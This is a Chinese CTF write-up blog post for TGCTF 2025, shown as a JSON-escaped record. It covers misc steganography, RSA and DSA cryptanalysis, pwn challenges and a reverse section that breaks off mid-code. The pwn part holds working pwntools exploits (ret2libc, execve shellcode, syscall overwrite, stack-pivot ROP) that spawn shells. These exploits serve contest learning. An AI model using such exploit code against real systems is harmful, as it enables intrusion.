ez_zip\n\n最外层直接爆破出zip密码为20250412，得到一个sh512.txt和End.zip，sh512.txt里面有一句话。\n\n打开End.zip发现里面是End文件夹以及flag.zip和一个sh512.txt，并且sh512.txt原大小为128字节。\n\n所以可知要将sh512.txt内容进行sha512加密，构建一个End.zip，进行明文爆破。\n\n![img](/images/1744633170179-48.png)\n\n将sha512结果存放End/sh512.txt\n\n![img](/images/1744633170179-49.png)\n\ndeflate压缩，压缩等级1。\n\n![img](/images/1744633170179-50.png)\n\n使用ARCHPR进行明文攻击解压出flag.zip。\n\n![img](/images/1744633170179-51.png)\n\n没法正常解压，使用010的zip模板进行修复。\n\n将frFileNameLength改为8，压缩方式改成DEFLATE保存，即可解压得到flag。\n\n![img](/images/1744633170179-52.png)\n\n![img](/images/1744633170179-53.png)\n\nTGCTF{Warrior_You_have_defeated_the_giant_dragon!}\n\n### 这是啥o_o\n\n给了一个gif发现后面有疑似二维码的碎片,拼接得到一个汉信码\n\n![img](/images/1744633170179-54.png)\n\n扫描得到提示 time is your fortune ,efficiency is your life\n\n推测和gif的延迟时间有关,修改010的gif模板,打印一下延迟时间得到一组看起来就很像asicc的东西\n\n![img](/images/1744633170179-55.png)\n\n解码得到flag\n\n```Plain\nenc=[84,71,67,84,70,123,89,111,117,95,99,97,117,103,104,116,95,117,112,95,119,105,116,104,95,116,105,109,101,33,125]\nfor i in enc:\n    print(chr(i),end='')\n```\n\n> TGCTF{You_caught_up_with_time!}\n\n### 你能发现图中的秘密吗?\n\n题目给出一个压缩包和一个png,压缩包有密码\n\npng查看red通道的lsb,发现密钥\n\n![img](/images/1744633170179-56.png)\n\n解压后给了一个png一个pdf\n\n查看pdf的二进制数据发现有ps相关的东西,用ps打开,发现了隐藏的flag图层查看获得第二段flag\n\n![img](/images/1744633170179-57.png)\n\nfinal_challenge2.png的一个chunk大小异常。\n\n![img](/images/1744633170179-58.png)\n\n提取，补上png文件头文件尾，然后爆破宽高就可以找到正确的宽高图片。\n\n![img](/images/1744633170179-59.png)\n\nflag{you_are_so_attentive_and_conscientous}\n","source":"_posts/TGCTF25-不知道-WP.md","raw":"---\ntitle: TGCTF25 不知道 WP\ndate: 2025-04-14 20:07:39\ntags: [cry,web,re,pwn,misc]\ncategories: wp\ntypora-root-url: ./..\n---\n\n# 战队名：不知道\n\n**排名：3**\n\n![](/images/1cf021f7478de3e000412729a45b5e50-1744633170181-120.png)\n\n## Crypto\n\n### AAAAAAAA·真·签到\n\nUGBRC{RI0G!O04_5C3_OVUI_DV_MNTB}\n\n和flag头对比发现偏移是-1，0，1，2，3，推测就是%26逐渐++\n\n```python\nenc='UGBRC{RI0G!O04_5C3_OVUI_DV_MNTB}'\n\ns='ABCDEFGHIJKLMNOPQRSTUVWXYZ'\nfor i in range(len(enc)):\n    if enc[i] in s:\n\n        ind=s.index(enc[i])\n        ind+=i-1\n        print(s[ind%26],end='')\n    else:\n        print(enc[i],end='')\n```\n\n> TGCTF{WO0O!Y04_5R3_GOOD_AT_MOVE}\n\n### mm不躲猫猫\n\n给了60组n，c，n有公共因子gcd求得解密即可\n\n```python\nfrom Crypto.Util.number import *\n\ne = 65537\n\nn_list = []\nc_list = []\n\ncurrent_n = None\ncurrent_c = None\n\nwith open('E:\\\\wenjian\\\\p\\\\timu\\\\tgCTF\\\\cry\\\\challenge.txt', 'r') as f:\n    for line in f:\n        line = line.strip()\n        if line.startswith('[') and line.endswith(']'):\n            if current_n is not None and current_c is not None:\n                n_list.append(current_n)\n                c_list.append(current_c)\n                current_n = None\n                current_c = None\n        elif line.startswith('n = '):\n            current_n = int(line.split('=')[1].strip())\n        elif line.startswith('c = '):\n            current_c = int(line.split('=')[1].strip())\n    \n    if current_n is not None and current_c is not None:\n        n_list.append(current_n)\n        c_list.append(current_c)\n\nfor i in range(len(c_list)):\n    n=n_list[i]\n    other=n_list[:i] + n_list[i+1:]\n    p=None\n    for j in other:\n        if GCD(n,j)!=1:\n            p=GCD(n,j)\n            q=n//p\n            break\n    if p == None:\n        continue\n\n    d=inverse(e,(p-1)*(q-1))\n    print(long_to_bytes(pow(c_list[i],d,n)))\n```\n\n> TGCTF{ExcePt10n4lY0u_Fl4gF0rY0u_555b0nus}\n\n### RwSiAns\n\n```python\nfrom flag import FLAG\nfrom Crypto.Util.number import getPrime, bytes_to_long\nimport hashlib\n\ndef generate_key(bits=512):\n    p = getPrime(bits)\n    q = getPrime(bits)\n    return p * q, 3\n\ndef hash(x):\n    return int(hashlib.md5(str(x).encode()).hexdigest(), 16)\n\ndef encrypt(m, n, e):\n    x1, x2 = 307, 7\n    c1 = pow(m + hash(x1), e, n)\n    c2 = pow(m + hash(x2), e, n)\n    return c1, c2\n\nm = bytes_to_long(FLAG)\nn, e = generate_key()\nc1, c2 = encrypt(m, n, e)\nprint(f\"n = {n}\")\nprint(f\"e = {e}\")\nprint(f\"c1 = {c1}\")\nprint(f\"c2 = {c2}\")\n\nn = 100885785256342169056765112203447042910886647238787490462506364977429519290706204521984596783537199842140535823208433284571495132415960381175163434675775328905396713032321690195499705998621049971024487732085874710868565606249892231863632731481840542506411757024315315311788336796336407286355303887021285839839\ne = 3\nc1 = 41973910895747673899187679417443865074160589754180118442365040608786257167532976519645413349472355652086604920132172274308809002827286937134629295632868623764934042989648498006706284984313078230848738989331579140105876643369041029438708179499450424414752031366276378743595588425043730563346092854896545408366\nc2 = 41973912583926901518444642835111314526720967879172223986535984124576403651553273447618087600591347032422378272332279802860926604693828116337548053006928860031338938935746179912330961194768693506712533420818446672613053888256943921222915644107389736912059397747390472331492265060448066180414639931364582445814\n```\n\n基础的相关信息攻击\n\n```python\nfrom Crypto.Util.number import *\nimport hashlib\n\ndef generate_key(bits=512):\n    p = getPrime(bits)\n    q = getPrime(bits)\n    return p * q, 3\n\ndef hash(x):\n    return int(hashlib.md5(str(x).encode()).hexdigest(), 16)\n\n\ndef encrypt(m, n, e):\n    x1, x2 = 307, 7\n    c1 = pow(m + hash(x1), e, n)\n    c2 = pow(m + hash(x2), e, n)\n    return c1, c2\n\n\nn = 100885785256342169056765112203447042910886647238787490462506364977429519290706204521984596783537199842140535823208433284571495132415960381175163434675775328905396713032321690195499705998621049971024487732085874710868565606249892231863632731481840542506411757024315315311788336796336407286355303887021285839839\ne = 3\nc1 = 41973910895747673899187679417443865074160589754180118442365040608786257167532976519645413349472355652086604920132172274308809002827286937134629295632868623764934042989648498006706284984313078230848738989331579140105876643369041029438708179499450424414752031366276378743595588425043730563346092854896545408366\nc2 = 41973912583926901518444642835111314526720967879172223986535984124576403651553273447618087600591347032422378272332279802860926604693828116337548053006928860031338938935746179912330961194768693506712533420818446672613053888256943921222915644107389736912059397747390472331492265060448066180414639931364582445814\ns1=hash(307)\ns2=hash(7)\n\ndef franklinReiter(n,e,c1,c2):\n    PR.<x> = PolynomialRing(Zmod(n))\n    g1 = (x+s1)^e - c1\n    g2 = (x+s2)^e - c2\n\n    def gcd(g1, g2):\n        while g2:\n            g1, g2 = g2, g1 % g2\n        return g1.monic()\n    return -gcd(g1, g2)[0]\n\nm=franklinReiter(n,e,c1,c2)\nprint(long_to_bytes(int(m)))\n```\n\n> TGCTF{RS4_Tw1nZ_d0You_th1nk_ItS_fun_2win?!!!1111111111}\n\n### 宝宝rsa\n\n```python\nfrom math import gcd\nfrom Crypto.Util.number import *\nfrom secret import flag\n\n# PART1\np1 = getPrime(512)\nq1 = getPrime(512)\nn1 = p1 * q1\nphi = (p1 - 1) * (q1 - 1)\nm1 = bytes_to_long(flag[:len(flag) // 2])\ne1 = getPrime(18)\nwhile gcd(e1, phi) != 1:\n    e1 = getPrime(17)\nc1 = pow(m1, e1, n1)\n\nprint(\"p1 =\", p1)\nprint(\"q1 =\", q1)\nprint(\"c1 =\", c1)\n\n# PART2\nn2 = getPrime(512) * getPrime(512)\ne2 = 3\nm2 = bytes_to_long(flag[len(flag) // 2:])\nc2 = pow(m2, e2, n2)\n\nprint(\"n2 =\", n2)\nprint(\"c2 =\", c2)\nprint(\"e2 =\", e2)\n```\n\nflag分两段，前一段未知e，但是比较小，直接爆破就行，第二段e=3，n为1024位，m应该比较小直接开方即可\n\n```python\nfrom tqdm import tqdm\n\nphi1=(p1-1)*(q1-1)\nfor i in tqdm(range(2**18,2**16,-1)):\n    if gcd(i, phi1) != 1:\n        continue\n    d=inverse(i,phi1)\n    m1=long_to_bytes(pow(c1,d,p1*q1))\n    if b'TGCTF' in m1:\n        break\n\nprint(m1)\n\n# ---------------------------------------------------\nfrom gmpy2 import *\n\nm2=long_to_bytes(int(gmpy2.iroot(c2,3)[0]))\nprint(m2)\n\nprint(m1+m2)\n```\n\n> TGCTF{!!3xP_Is_Sm@ll_But_D@ng3r0}\n\n### 费克特尔\n\n```python\nc=670610235999012099846283721569059674725712804950807955010725968103642359765806\nn=810544624661213367964996895060815354972889892659483948276203088055391907479553\ne=65537\n```\n\nn很小直接yafu分一下,有很多因子,正常解即可\n\n```python\nfrom Crypto.Util.number import *\n\nc=670610235999012099846283721569059674725712804950807955010725968103642359765806\nn=810544624661213367964996895060815354972889892659483948276203088055391907479553\ne=65537\n\np= [916848439436544911290378588839845528581,214168842768662180574654641, 2001511,18251 ,113 ]\nphi=1\nfor i in p:\n    phi*=(i-1)\n\nd=inverse(e,phi)\n\nprint(long_to_bytes(pow(c,d,n)))\n```\n\n> TGCTF{f4888_6abdc_9c2bd_9036bb}\n\n###  EZRSA\n\n```python\nfrom Crypto.Util.number import *\n\ndef genarate_emojiiiiii_prime(nbits, base=0):\n    while True:\n        p = getPrime(base // 32 * 32) if base >= 3 else 0\n        for i in range(nbits // 8 // 4 - base // 32):\n            p = (p << 32) + get_random_emojiiiiii() # 猜一猜\n        if isPrime(p):\n            return p\n\nm = bytes_to_long(flag.encode()+ \"\".join([long_to_bytes(get_random_emojiiiiii()).decode() for _ in range(5)]).encode())\np = genarate_emojiiiiii_prime(512, 224)\nq = genarate_emojiiiiii_prime(512)\n\nn = p * q\ne = \"💯\"\nc = pow(m, bytes_to_long(e.encode()), n)\n\nprint(\"p0 =\", long_to_bytes(p % 2 ** 256).decode())\nprint(\"n =\", n)\nprint(\"c =\", c)\n\np0 = '😘😾😂😋😶😾😳😷'\nn = 156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579\nc = 47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401\n```\n\n根据genarate_emojiiiiii_prime(512, 224)发现,p的结构,高位为224位素数,低位为9个emoji一个32位\n\n题目给出了后8个emoji,查看每个emoji的十进制发现只有最后2位不一样,也就是说只爆破100个左右即可\n\n知道低32*9=288位即可copper得到p\n\ne和phi有公共因子，有限域开方crt遍历一下即可\n\n```python\nfrom Crypto.Util.number import *\n\np0_ = 108837065531980906150333850570890620719343963272506332719822248235755953428663\nn = 156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579\nc = 47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401\n\na=4036991100\n\nfrom tqdm import tqdm\nfor i in tqdm(range(100)):\n    PR.<x> = PolynomialRing(Zmod(n))\n    f = x * 2^288 + p0_ + (a+i)*2^256\n    f = f.monic()\n    roots = f.small_roots(X=2^225, beta=0.4,epsilon=0.04)\n\n    if roots:\n        x = roots[0]\n        p_candidate = int(x * 2^288 + p0_ + (a+i)*2^256)\n        if n % p_candidate == 0:\n            print(\"Found p:\", p_candidate)\n            q_candidate = n // p_candidate\n            break\n\nfrom gmpy2 import *\nfrom random import *\nfrom libnum import *\n\np=int(p_candidate)\nq=int(q_candidate)\ne=int(4036989615)\n\nprint(p,q,n%p,n%q)\n\nprint(GCD(e,(p-1)*(q-1)))\nprint(GCD(e,(p-1)))\nprint(GCD(e,(q-1)))\n\nd=inverse(e//GCD(e,(p-1)*(q-1)),(p-1)*(q-1))\nc=pow(c,d,n)\n\nR.<y>=Zmod(p)[]\nf=y^15-c\nf=f.monic()\nm1=f.roots()\n\nR.<z>=Zmod(q)[]\nf=z^15-c\nf=f.monic()\nm2=f.roots()\n\nfor i in m1:\n    for j in m2:\n        m=solve_crt([int(i[0]),int(j[0])],[int(p),int(q)])\n        print(long_to_bytes(int(m)))\n        if b'TGCTF' in long_to_bytes(int(m)):\n            print(long_to_bytes(int(m)).decode())\n```\n\n记得解码flag,不然就会出现解出flag了但是全是字节码导致我以为哪里错了\n\n> TGCTF{🙇🏮🤟_🫡🫡🫡_🚩🚩🚩}😃😖😘😨😢\n\n### ****LLLCG****\n\n```python\nfrom hashlib import sha256\nfrom Crypto.Util.number import *\nfrom random import randint\nimport socketserver\nfrom secret import flag, dsa_p, dsa_q\n\nclass TripleLCG:\n    def __init__(self, seed1, seed2, seed3, a, b, c, d, n):\n        self.state = [seed1, seed2, seed3]\n        self.a = a\n        self.b = b\n        self.c = c\n        self.d = d\n        self.n = n\n\n    def next(self):\n        new = (self.a * self.state[-3] + self.b * self.state[-2] + self.c * self.state[-1] + self.d) % self.n\n        self.state.append(new)\n        return new\n\nclass DSA:\n    def __init__(self):\n        # while True:\n            # self.q = getPrime(160)\n            # t = 2 * getPrime(1024 - 160) * self.q\n            # if isPrime(t + 1):\n            #    self.p = t + 1\n            #    break\n        self.p = dsa_p\n        self.q = dsa_q\n        self.g = pow(2, (self.p - 1) // self.q, self.p)\n        self.x = randint(1, self.q - 1)\n        self.y = pow(self.g, self.x, self.p)\n\n    def sign(self, msg, k):\n        h = bytes_to_long(sha256(msg).digest())\n        r = pow(self.g, k, self.p) % self.q\n        s = (inverse(k, self.q) * (h + self.x * r)) % self.q\n        return (r, s)\n\n    def verify(self, msg, r, s):\n        if not (0 < r < self.q and 0 < s < self.q):\n            return False\n        h = bytes_to_long(sha256(msg).digest())\n        w = inverse(s, self.q)\n        u1 = (h * w) % self.q\n        u2 = (r * w) % self.q\n        v = ((pow(self.g, u1, self.p) * pow(self.y, u2, self.p)) % self.p) % self.q\n        return v == r\n\nclass Task(socketserver.BaseRequestHandler):\n    def _recvall(self):\n        BUFF_SIZE = 2048\n        data = b''\n        while True:\n            part = self.request.recv(BUFF_SIZE)\n            data += part\n            if len(part) < BUFF_SIZE:\n                break\n        return data.strip()\n\n    def send(self, msg, newline=True):\n        if newline:\n            msg += b'\\n'\n        self.request.sendall(msg)\n\n    def recv(self, prompt=b'[-] '):\n        self.send(prompt, newline=False)\n        return self._recvall()\n\n    def handle(self):\n        n = getPrime(128)\n        a, b, c, d = [randint(1, n - 1) for _ in range(4)]\n        seed1, seed2, seed3 = [randint(1, n - 1) for _ in range(3)]\n\n        lcg = TripleLCG(seed1, seed2, seed3, a, b, c, d, n)\n        dsa = DSA()\n\n        self.send(b\"Welcome to TGCTF Challenge!\\n\")\n        self.send(f\"p = {dsa.p}, q = {dsa.q}, g = {dsa.g}, y = {dsa.y}\".encode())\n\n        small_primes = [59093, 65371, 37337, 43759, 52859, 39541, 60457, 61469, 43711]\n        used_messages = set()\n        for o_v in range(3):\n            self.send(b\"Select challenge parts: 1, 2, 3\\n\")\n            parts = self.recv().decode().split()\n\n            if '1' in parts:\n                self.send(b\"Part 1\\n\")\n                for i in range(12):\n                    self.send(f\"Message {i + 1}: \".encode())\n                    msg = self.recv()\n                    used_messages.add(msg)\n                    k = lcg.next()\n                    r, s = dsa.sign(msg, k)\n                    self.send(f\"r = {r}, ks = {[k % p for p in small_primes]}\\n\".encode())\n\n            if '2' in parts:\n                self.send(b\"Part 2\\n\")\n                for _ in range(307):\n                    k = lcg.next()\n                for i in range(10):\n                    self.send(f\"Message {i + 1}: \".encode())\n                    msg = self.recv()\n                    k = lcg.next() % dsa.q\n                    r, s = dsa.sign(msg, k)\n                    self.send(f\"Signature: r = {r}, s = {s}\\n\".encode())\n                    used_messages.add(msg)\n\n            if '3' in parts:\n                self.send(b\"Part 3\\n\")\n                self.send(b\"Forged message: \")\n                final_msg = self.recv()\n                self.send(b\"Forged r: \")\n                r = int(self.recv())\n                self.send(b\"Forged s: \")\n                s = int(self.recv())\n\n                if final_msg in used_messages:\n                    self.send(b\"Message already signed!\\n\")\n                elif dsa.verify(final_msg, r, s):\n                    self.send(f\"Good! Your flag: {flag}\\n\".encode())\n                else:\n                    self.send(b\"Invalid signature.\\n\")\n```\n\n分析代码,给出了一个自定的三重lcg,part1给出12组签名的r,以及一个k与很多素数的模的list\n\n9个素数,每个16位，乘积大于k的128位,所以crt可以恢复出k的值\n\n现在相当于拥有12组k,根据12组k逆向lcg即可\n\n使用Grobner基解同余方程组,即可恢复所有参数,接下来预测k值,p,q,g,y均为已知值,即可计算得到x\n\n然后伪造签名即可\n\n```python\nfrom pwn import *\nfrom Crypto.Util.number import *\nfrom hashlib import sha256\n\nsh=remote(\"node1.tgctf.woooo.tech\",31104)\ncontext.log_level='debug'\n\nsmall_primes = [59093, 65371, 37337, 43759, 52859, 39541, 60457, 61469, 43711]\n\nclass TripleLCG:\n    def __init__(self, seed1, seed2, seed3, a, b, c, d, n):\n        self.state = [seed1, seed2, seed3]\n        self.a = a\n        self.b = b\n        self.c = c\n        self.d = d\n        self.n = n\n\n    def next(self):\n        new = (self.a * self.state[-3] + self.b * self.state[-2] + self.c * self.state[-1] + self.d) % self.n\n        self.state.append(new)\n        return new\n\nclass DSA:\n    def __init__(self):\n        # while True:\n            # self.q = getPrime(160)\n            # t = 2 * getPrime(1024 - 160) * self.q\n            # if isPrime(t + 1):\n            #    self.p = t + 1\n            #    break\n        self.p = dsa_p\n        self.q = dsa_q\n        self.g = pow(2, (self.p - 1) // self.q, self.p)\n        self.x = randint(1, self.q - 1)\n        self.y = pow(self.g, self.x, self.p)\n\n    def sign(self, msg, k):\n        h = bytes_to_long(sha256(msg).digest())\n        r = pow(self.g, k, self.p) % self.q\n        s = (inverse(k, self.q) * (h + self.x * r)) % self.q\n        return (r, s)\n\n    def verify(self, msg, r, s):\n        if not (0 < r < self.q and 0 < s < self.q):\n            return False\n        h = bytes_to_long(sha256(msg).digest())\n        w = inverse(s, self.q)\n        u1 = (h * w) % self.q\n        u2 = (r * w) % self.q\n        v = ((pow(self.g, u1, self.p) * pow(self.y, u2, self.p)) % self.p) % self.q\n        return v == r\n# -------------------------------------------------\n# get pqgy\n\nsh.recvuntil(b'!\\n')\nsh.recvuntil(b'\\n')\n\nsh.recvuntil(b'p = ')\np=int(sh.recvuntil(b',').decode()[:-1])\nprint('p = ',p)\nsh.recvuntil(b'q = ')\nq=int(sh.recvuntil(b',').decode()[:-1])\nprint('q = ',q)\nsh.recvuntil(b'g = ')\ng=int(sh.recvuntil(b',').decode()[:-1])\nprint('g = ',g)\nsh.recvuntil(b'y = ')\ny=int(sh.recvuntil(b'\\n').decode()[:-1])\nprint('y = ',y)\n\nprint('----------------------------------------------------')\n# part 1\nsh.recvuntil(b'] ')\nsh.sendline(b'1')\nr_l=[]\nks_l=[]\nfor i in range(12):\n    sh.recvuntil(b'] ')\n    sh.sendline(b'1')\n    sh.recvuntil(b'r = ')\n    r=int(sh.recvuntil(b',').decode()[:-1])\n    print('r = ',r)\n    sh.recvuntil(b'ks = ')\n    ks=eval(sh.recvuntil(b'\\n').decode()[:-1])\n    print('ks = ',ks)\n    r_l.append(r)\n    ks_l.append(ks)\n\nprint(r_l,ks_l)\n\nfrom libnum import *\ndef recover_k(residues):    \n    return solve_crt(residues,small_primes)\n\nk_ = [recover_k(i) for i in ks_l]\nprint(k_)\n\n#k_= [172878032310918761957320639543653575954, 65601781483750822156822913226632595144, 10096210446214282339114263785545264202, 95107391569799156514079455200709366408, 117644907547146123900198723640727373206, 37631792366646059834025110885248419285, 105367623507085661118822334572436160357, 108765893575822931804483321330995468016, 151400201142369776561490646780034750340, 124744556917675016810611051516964200333, 32083522257873898706547528258092321135, 28282985849414089611886533440861756190]\n\nR.<a,b,c,d> = PolynomialRing(ZZ)\n\nf1=k_[0]*a+k_[1]*b+k_[2]*c+d-k_[3]\nf2=k_[1]*a+k_[2]*b+k_[3]*c+d-k_[4]\nf3=k_[2]*a+k_[3]*b+k_[4]*c+d-k_[5]\nf4=k_[3]*a+k_[4]*b+k_[5]*c+d-k_[6]\nf5=k_[4]*a+k_[5]*b+k_[6]*c+d-k_[7]\nf6=k_[5]*a+k_[6]*b+k_[7]*c+d-k_[8]\nf7=k_[6]*a+k_[7]*b+k_[8]*c+d-k_[9]\nf8=k_[7]*a+k_[8]*b+k_[9]*c+d-k_[10]\nf9=k_[8]*a+k_[9]*b+k_[10]*c+d-k_[11]\n\nF=[f1,f2,f3,f4,f5,f6,f7,f8,f9]\nideal = Ideal(F)\n\nI = ideal.groebner_basis()\nprint(I)\nn = int(I[4])\na = int(-I[0].univariate_polynomial()(0))%n\nb = int(-I[1].univariate_polynomial()(0))%n\nc = int(-I[2].univariate_polynomial()(0))%n\nd = int(-I[3].univariate_polynomial()(0))%n\n\nprint(a,b,c,d,n)\nprint(a.bit_length(),b.bit_length(),c.bit_length(),d.bit_length(),n.bit_length())\n\nlcg=TripleLCG(k_[-3],k_[-2],k_[-1],a,b,c,d,n)\n\nprint('--------------------------------------------------')\n#part 2\n\nsh.recvuntil(b'] ')\nsh.sendline(b'2')\nsh.recvuntil(b' 2\\n')\n\nfor _ in range(307):\n    k = lcg.next()\n\nr_l2 = []\ns_l = []\n\nfor i in range(10):\n    sh.recvuntil(b'] ')\n    sh.sendline(b'a')\n\n    sh.recvuntil(b'r = ')\n    r=int(sh.recvuntil(b',').decode()[:-1])\n    print('r = ',r)\n    sh.recvuntil(b's = ')\n    s=int(sh.recvuntil(b'\\n').decode()[:-1])\n    print('s = ',s)\n\n    r_l2.append(r)\n    s_l.append(s)\nprint(r_l2,s_l)\nprint(len(r_l2),len(s_l))\n\nm = b'a'\nh = bytes_to_long(sha256(m).digest())\nk = lcg.next()\nprint('k=',k)\ninv_r=inverse(r_l2[0],q)\nx = ((s_l[0]*k%q-h)*inv_r) % q\nprint(x)\n\nprint(\"------------------------------------------\")\n#part 3\n\nsh.recvuntil(b'] ')\nsh.sendline(b'3')\n\nend_m=b'b'\nsh.recvuntil(b'e: ')\nsh.sendline(end_m)\n\nend_h = bytes_to_long(sha256(b'b').digest())\nr_ = pow(g,1,p)%q\ns_ = ((end_h+x*r_)*inverse(1,q))%q\nprint(r_,s_)\n\nsh.recvuntil(b'r: ')\nsh.sendline(str(r_).encode())\nsh.recvuntil(b's: ')\nsh.sendline(str(s_).encode())\nsh.recvlines()\n\nsh.interactive()\n```\n\n![img](/images/1744633170180-60.png)\n\n## Pwn\n\n### 签到\n\n栈溢出，打ret2libc。\n\n```python\nfrom pwn import *\n\nio=process(\"./pwn\")\nlibc=ELF(\"libc.so.6\")\n\nplt=0x0401060\ngot=0x0404018\nrdi=0x0401176\nstart=0x0401090\nret=0x040101a\n\np=b\"A\"*120+p64(rdi)+p64(got)+p64(plt)+p64(start)\nio.sendlineafter(\"name.\", p)\nlibc.address=u64(io.recvuntil(b\"\\x7f\")[-6:].ljust(8, b\"\\x00\"))-libc.sym[\"puts\"]\nprint(hex(libc.address))\n\np=b\"A\"*120+p64(ret)+p64(rdi)+p64(next(libc.search(b'/bin/sh')))+p64(libc.sym[\"system\"])\nio.sendlineafter(\"name.\", p)\n\nio.interactive()\n```\n\n### shellcode\n\nShellcode 限制0x12 大小，不能在mmap可执行区域二次写。\n\n所有寄存器都被清空了，除了rdi为mmap可执行区域。\n\n改eax成execve系统调用，之后再加rdi到写入/bin/sh的偏移，最后syscall去拿shell。\n\neax省2字节\n\n```python\nfrom pwn import *\n\ncontext.arch=\"amd64\"\n\nio = process(\"./pwn\")\n\nsc=asm('''\nmov eax, 0x3b\nadd rdi, 0xb\nsyscall\n''')+b\"/bin/sh\"\n\nprint(len(sc))\nio.send(sc)\n\nio.interactive()\n```\n\n### stack\n\n第一次输入会在0x0404060处读0xa8 字节，第二次读有栈溢出，题目模拟了canary保护会跳到sub_4011B6。\n\n![img](/images/1744633170177-2.png)\n\nsub_4011B6会从qword_4040a0处拿rax， fd 拿rdi， buf拿rsi，count拿rdx。\n\n![img](/images/1744633170177-3.png)\n\n第一次写可以溢出到这些位置来改变syscall，伪造成execve(\"/bin/sh\", 0, 0)。\n\n```python\nfrom pwn import *\n\nio=process(\"./pwn\")\n\np=b\"A\"*64+p64(0x3b)+p64(0x0404108)+p64(0)*2\nio.sendafter(\"name?\", p)\nio.sendafter(\"say?\", b\"A\"*0x50)\n\nio.interactive()\n```\n\n### overflow\n\nx86 静态编译，有栈溢出。\n\n![img](/images/1744633170177-4.png)\n\n返回之前可以栈迁移到任意地址，把栈迁移到第一次read再用第一次read写入rop即可。\n\n```python\nfrom pwn import *\n\nio=process(\"./pwn\")\ncontext.terminal = [\"tmux\", \"splitw\", \"-h\"]\n\neax=0x080b470a\nebx=0x08049022\necx=0x08049802\nedx=0x08060bd1\n\nrop=p32(eax)+p32(0xb)\nrop+=p32(ebx)+p32(0x80ef344)\nrop+=p32(ecx)+p32(0)\nrop+=p32(edx)+p32(0)\nrop+=p32(0x08049c6a)\nrop+=b\"/bin/sh\\0\"\n\nprint(len(rop))\nio.sendafter(\"name?\", rop)\n\np=b'A'*(200)+p32(0x080EF320+4)*3\nio.sendlineafter(\"right?\", p)\n\nio.interactive()\n```\n\n## Reverse\n\n### Base64\n\nBase64变种加密\n\n```cpp\n_BYTE *__fastcall sub_7FF7DC6C10E0(__int64 a1)\n{\n  __int64 v2; // rbx\n  __int64 v3; // rbp\n  int v4; // edx\n  int v5; // edi\n  int v6; // edx\n  __int64 v7; // r14\n  size_t v8; // rcx\n  _BYTE *v9; // r8\n  __int64 v10; // r9\n  unsigned __int64 v11; // rdx\n  int v12; // ecx\n  unsigned int v13; // ecx\n  unsigned int v14; // eax\n  int v15; // eax\n  int v16; // eax\n  int v17; // eax\n  int v18; // edi\n  __int64 v19; // rdx\n  int v20; // eax\n  int v21; // eax\n  int v22; // ecx\n  unsigned int v23; // edx\n  int v24; // ecx\n  int v25; // eax\n  int v26; // ecx\n  unsigned int v27; // ecx\n  unsigned int v28; // eax\n  char v30[80]; // [rsp+20h] [rbp-68h] BYREF\n  int v31; // [rsp+90h] [rbp+8h]\n\n  v2 = -1;\n  strcpy(v30, \"GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI\");\n  do\n    ++v2;\n  while ( *(_BYTE *)(a1 + v2) );\n  v3 = 0;\n  v4 = (int)v2 / 3;\n  if ( (_DWORD)v2 == 3 * ((int)v2 / 3) )\n  {\n    v5 = 0;\n    v6 = 4 * v4;\n  }\n  else if ( (int)v2 % 3 == 1 )\n  {\n    v5 = 1;\n    v6 = 4 * v4 + 4;\n  }\n  else if ( (int)v2 % 3 == 2 )\n  {\n    v5 = 2;\n    v6 = 4 * v4 + 4;\n  }\n  else\n  {\n    v5 = v31;\n    v6 = v31;\n  }\n  v7 = v6;\n  v8 = v6 + 1LL;\n  if ( v6 == -1 )\n    v8 = -1;\n  v9 = malloc(v8);\n  if ( (int)v2 - v5 > 0 )\n  {\n    v10 = a1 + 2;\n    v11 = ((int)v2 - v5 - 1LL) / 3uLL + 1;\n    do\n    {\n      v3 += 4;\n      v12 = *(unsigned __int8 *)(v10 - 2) >> 2;\n      v10 += 3;\n      v13 = v12 + 24;\n      v14 = v13 - 64;\n      if ( v13 <= 0x40 )\n        v14 = v13;\n      v9[v3 - 4] = v30[v14];\n      v15 = ((*(unsigned __int8 *)(v10 - 4) >> 4) | (16 * (*(_BYTE *)(v10 - 5) & 3))) - 40;\n      if ( ((*(unsigned __int8 *)(v10 - 4) >> 4) | (16 * (*(_BYTE *)(v10 - 5) & 3u))) + 24 <= 0x40 )\n        v15 = ((*(unsigned __int8 *)(v10 - 4) >> 4) | (16 * (*(_BYTE *)(v10 - 5) & 3))) + 24;\n      v9[v3 - 3] = v30[v15];\n      v16 = ((*(unsigned __int8 *)(v10 - 3) >> 6) | (4 * (*(_BYTE *)(v10 - 4) & 0xF))) - 40;\n      if ( ((*(unsigned __int8 *)(v10 - 3) >> 6) | (4 * (*(_BYTE *)(v10 - 4) & 0xFu))) + 24 <= 0x40 )\n        v16 = ((*(unsigned __int8 *)(v10 - 3) >> 6) | (4 * (*(_BYTE *)(v10 - 4) & 0xF))) + 24;\n      v9[v3 - 2] = v30[v16];\n      v17 = (*(_BYTE *)(v10 - 3) & 0x3F) - 40;\n      if ( (*(_BYTE *)(v10 - 3) & 0x3Fu) + 24 <= 0x40 )\n        v17 = (*(_BYTE *)(v10 - 3) & 0x3F) + 24;\n      v9[v3 - 1] = v30[v17];\n      --v11;\n    }\n    while ( v11 );\n  }\n  v18 = v5 - 1;\n  if ( !v18 )\n  {\n    v25 = (*(unsigned __int8 *)((int)v2 + a1 - 1) >> 2) - 40;\n    if ( (*(unsigned __int8 *)((int)v2 + a1 - 1) >> 2) + 24 <= 0x40u )\n      v25 = (*(unsigned __int8 *)((int)v2 + a1 - 1) >> 2) + 24;\n    v9[v7 - 4] = v30[v25];\n    v26 = *(_BYTE *)((int)v2 + a1 - 1) & 3;\n    *(_WORD *)&v9[v7 - 2] = 15677;\n    v27 = 16 * v26 + 24;\n    v28 = v27 - 64;\n    if ( v27 <= 0x40 )\n      v28 = v27;\n    